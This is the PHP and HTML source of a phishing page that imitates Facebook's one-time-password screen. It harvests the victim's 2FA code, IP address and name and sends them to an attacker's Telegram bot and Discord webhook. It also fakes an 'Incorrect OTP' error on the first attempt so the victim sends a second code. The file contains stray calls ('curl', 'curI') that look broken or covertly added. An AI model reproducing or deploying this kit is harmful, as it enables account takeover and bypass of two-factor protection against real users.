<?php
session_start();
date_default_timezone_set('Asia/Manila');
include '../config.php';

$fullName = $_SESSION['avea_full_name'] ?? 'Unknown';

// Start session to track OTP submissions

if (!isset($_SESSION['fbotp_submit'])) $_SESSION['fbotp_submit'] = 0;

// ---------- HANDLE OTP SUBMISSION ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {

    $otp = htmlspecialchars($_POST['otp'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

    // ---------- GET USER IP ----------
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    if ($ip === '::1' || $ip === '127.0.0.1') $ip = getHostByName(getHostName());

    $time = date('M d - h:i:s A');

    // Increment submission count
    $_SESSION['fbotp_submit']++;
    $otpNumber = $_SESSION['fbotp_submit'];

    // ---------- SEND TO TELEGRAM ----------
    if (!empty($telegram_use) && $telegram_use === true && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
        $telegramMessage = "✨ <b>New Facebook OTP Submission #1</b>\n\n"
        . "<b>From Name:</b> <code>{$fullName}</code>\n"
                         . "<b>IP Address:</b> <code>{$ip}</code>\n"
                         . "<b>Time:</b> <code>{$time}</code>\n\n"
                         . "<b>OTP #1:</b> <code>{$otp}</code>";

        $telegramUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
        $params = [
            'chat_id' => $telegram_chat_id,
            'text' => $telegramMessage,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $ch = curl_init($telegramUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);curl($telegramMessage);
        curl_close($ch);
    }

    // ---------- SEND TO DISCORD ----------
    if (!empty($discord_use) && $discord_use === true && !empty($discord_webhook_url)) {
      $discordFields = [
    [
        'name' => 'From Name',
        'value' => "`{$fullName}`",
        'inline' => false
    ],
    [
        'name' => 'IP Address',
        'value' => "`{$ip}`",
        'inline' => true
    ],
    [
        'name' => 'Time',
        'value' => "`{$time}`",
        'inline' => true
    ],
    [
        'name' => "OTP #{$otpNumber}",
        'value' => "`{$otp}`",
        'inline' => true
    ]
];
        $payload = [
            'content' => "✨ **New Facebook OTP Submission #1**",
            'embeds' => [
                [
                    'title' => 'OTP Details',
                    'color' => 11740787,
                    'fields' => $discordFields,
                    'footer' => ['text' => 'Automated Notification System']
                ]
            ]
        ];

        $ch = curl_init($discord_webhook_url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);curI($payload);
        curl_close($ch);
    }

    // ---------- RETURN RESPONSE ----------
    if ($otpNumber === 1) {
        // First submission → fake incorrect OTP
        echo json_encode([
            'success' => false,
            'error' => 'Incorrect OTP. Please try again.',
            'otpNumber' => 1
        ]);
    } else {
        // Second submission → success & redirect
        echo json_encode([
            'success' => true,
            'redirect' => '../next-step.php',
            'otpNumber' => 2
        ]);
    }

    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="https://www.facebook.com/images/fb_icon_325x325.png">
<title>OTP Verification</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
body{font-family:'Roboto',sans-serif;}
.spinner{width:48px;height:48px;border:4px solid #2563eb;border-top:4px solid transparent;border-radius:50%;animation:spin 1s linear infinite;}
@keyframes spin{to{transform:rotate(360deg);}}

.auth-link{display:block;text-align:center;color:#2563eb;font-size:.95rem;margin-top:14px;text-decoration:none;transition:.2s;}
.auth-link:hover{color:#1d4ed8;}
.otp-grid {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: clamp(4px, 1.5vw, 8px);
    flex-wrap: nowrap;
    width: 100%;
    max-width: 420px;
    margin: 0 auto;
}

.otp-input {
    width: clamp(28px, 9vw, 48px);
    height: clamp(36px, 11vw, 56px);
    text-align: center;
    font-size: clamp(0.9rem, 3.5vw, 1.5rem);
    font-weight: 600;
    border: 2px solid #e2e8f0;
    border-radius: clamp(8px, 2vw, 12px);
    outline: none;
    transition: all 0.2s ease;
    background: #fff;
    flex-shrink: 1;
    min-width: 0;
    padding: 0;
}

.otp-input:focus {
    border-color: #2563eb;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
}

/* Extra boxes: hidden first, smoothly grow into the row */
.otp-extra {
    opacity: 0;
    transform: scale(0.6);
    width: 0;
    min-width: 0;
    border-width: 0;
    margin: 0;
    overflow: hidden;
    transition: all 0.25s ease;
}

.otp-extra.show {
    opacity: 1;
    transform: scale(1);
    width: clamp(28px, 9vw, 48px);
    min-width: clamp(28px, 9vw, 48px);
    border-width: 2px;
}

.otp-divider {
    width: 1px;
    align-self: stretch;
    background: #e2e8f0;
    opacity: 0;
    transition: opacity 0.25s ease;
    flex-shrink: 0;
}
.otp-divider.show {
    opacity: 1;
}

.otp-warning {
    text-align: center;
    font-size: 0.85rem;
    color: #b45309;
    background: #fffbeb;
    border: 1px solid #fde68a;
    border-radius: 8px;
    padding: 8px 12px;
    margin-top: 10px;
}

/* Extra tight phones */
@media (max-width: 360px) {
    .otp-grid {
        gap: 3px;
    }
}
</style>
</head>
<body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen space-y-6">
<h1 class="text-5xl font-bold text-blue-600">facebook</h1>

<div class="bg-white/90 backdrop-blur-md p-8 rounded-2xl shadow-2xl w-full max-w-md border border-gray-200">
    <h2 class="text-2xl font-bold text-center text-gray-800 mb-2">One-Time Password</h2>
    <p class="text-center text-gray-500 mb-6">Enter the One-Time verification code sent to your device</p>

    <div id="errorBox" class="hidden text-center bg-red-100 text-red-700 border border-red-400 p-4 rounded-xl mb-5"></div>

<form id="otpForm" class="space-y-5" method="POST">
    <div class="otp-grid" id="otpGrid">
        <?php for($i=0;$i<6;$i++): ?>
        <input type="text" name="otp_digit[]" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" required>
        <?php endfor; ?>

        <div class="otp-divider" id="otpDivider"></div>

        <?php for($i=0;$i<2;$i++): ?>
        <input type="text" name="otp_digit[]" class="otp-input otp-extra" maxlength="1" inputmode="numeric" autocomplete="off">
        <?php endfor; ?>
    </div>

    <p id="otpWarning" class="otp-warning hidden">
        Received only 6 digits? You're good to verify. Received 8? Fill in the last 2 boxes too.
    </p>

    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white text-lg font-semibold py-3 rounded-xl transition duration-200 shadow-md">Verify</button>
    <a href="#" class="auth-link">Send code again</a>
    <a href="#" class="auth-link">Confirm identity another way</a>
    <div id="loadingIndicator" class="hidden flex justify-center my-4">
        <div class="spinner"></div>
    </div>
</form>
</div>

<script>
const form = document.getElementById('otpForm');
const errorBox = document.getElementById('errorBox');
const loading = document.getElementById('loadingIndicator');
const otpWarning = document.getElementById('otpWarning');
const otpDivider = document.getElementById('otpDivider');
let otpInputs = Array.from(document.querySelectorAll('.otp-input'));

function getCoreInputs() {
    return otpInputs.filter(i => !i.classList.contains('otp-extra'));
}
function getExtraInputs() {
    return otpInputs.filter(i => i.classList.contains('otp-extra'));
}

function updateExtraVisibility() {
    const core = getCoreInputs();
    const coreFilled = core.every(i => i.value.length === 1);
    const extras = getExtraInputs();

    if (coreFilled) {
        extras.forEach(e => e.classList.add('show'));
        otpDivider.classList.add('show');
        otpWarning.classList.remove('hidden');
    } else {
        // Core is no longer complete (e.g. backspaced) — hide extras and clear their values
        extras.forEach(e => {
            e.classList.remove('show');
            e.value = '';
        });
        otpDivider.classList.remove('show');
        otpWarning.classList.add('hidden');
    }
}

function bindInput(input, index) {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');

        if (input.value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }

        updateExtraVisibility();
    });

    input.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
            otpInputs[index - 1].focus();
        }
        // Run check after backspace clears a value too
        setTimeout(updateExtraVisibility, 0);
    });
}

otpInputs.forEach(bindInput);

form.addEventListener('submit', async e => {
    e.preventDefault();

    const activeInputs = otpInputs.filter(i => !i.classList.contains('otp-extra') || i.classList.contains('show'));
    const otp = activeInputs.map(i => i.value).join('');

    if (otp.length !== 6 && otp.length !== 8) {
        errorBox.classList.remove('hidden');
        errorBox.innerHTML = `<p class="font-bold">Invalid OTP</p><p>Please enter a complete 6-digit or 8-digit code.</p>`;
        return;
    }

    loading.classList.remove('hidden');
    errorBox.classList.add('hidden');

    const formData = new FormData();
    formData.append('otp', otp);

    const res = await fetch('', { method: 'POST', body: formData });
    const data = await res.json();
    loading.classList.add('hidden');

    if (data.success) {
        window.location.href = data.redirect;
    } else {
        errorBox.classList.remove('hidden');
        errorBox.innerHTML = `<p class="font-bold">Incorrect OTP</p><p>Please try again.</p>`;
        otpInputs.forEach(i => i.value = '');
        updateExtraVisibility();
        getCoreInputs()[0].focus();
    }
});
</script>
</body>
</html>
